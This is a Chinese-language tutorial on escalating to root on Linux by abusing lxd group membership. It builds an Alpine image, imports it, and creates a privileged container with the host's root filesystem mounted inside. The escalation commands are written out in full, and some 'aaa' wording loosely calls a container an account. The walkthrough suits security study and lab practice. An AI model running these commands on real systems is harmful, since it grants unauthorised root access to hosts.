介绍


三个概念就是lxd、lxc和docker。

lxc：是一个系统容器，使进程之间相互隔离，进程虚拟化。
lxd：lxc有些缺点，例如不能进行容器迁移，管理比较复杂等，所以进行了升级，即lxd，用来管理容器。
docker：lxc和lxd都是系统容器，而docker是应用程序容器。

总结：lxc是系统容器。lxd是守护程序，来管理lxc的所有容器。docker是应用程序容器。

攻击机设置


这里攻击机以kali为例，首先需要下载alpine，然后进行build构建，命令如下图。



此时就会生成一个tar.gz包，把该包传到目标机的tmp下。




导入tmp后，我们把该映像添加到lxd中，添加后可通过lxc image list查看。



随后进行提权操作，相关命令和说明如下：


# lxc init来初始化myimage，也就是alpine系统，并创建aaa账户，这里指的就是自己，通过c参数来配置安全提升策略为true，代表aaa可申请高级权限，命令如下：lxc init myimage aaa -c security.privileged=true# lxc config device命令用来配置设备，add把mydevice设备添加到了aaa账户中，disk是磁盘挂载，把本机/目录挂载到容器的/mnt下，recursive即是否递归，代表是否将所有子目录及所有文件进行挂载，命令如下：lxc config device add aaa mydevice disk source=/ path=/mnt/root recursive=true# 然后利用lxc start来启动刚刚添加的用户lxc start aaa# 最后利用lxc exec来执行程序，以aaa执行shlxc exec aaa /bin/sh



这里为了测试是否是本机的root，可以在本机以root身份创建个flag文件，然后aaa看是否可以读取到。



总结


1，目标机安装了lxd容器，且需要利用的普通用户在lxd组。

2，下载alpine（轻量级的linux系统，大小在5m左右），传到目标机。

3，把alpine导入到容器中。

4，然后就是初始化alpine、添加当前的普通账户、配置挂载等操作。

5，配置好后启动即可。


上面操作和上一节的docker提权操作类似，都是通过apline来把宿主机的root目录挂载进行。只不过docker是通过v、i、t三个参数一条命令就可以，而lxd稍微麻烦，配置项多了几个。
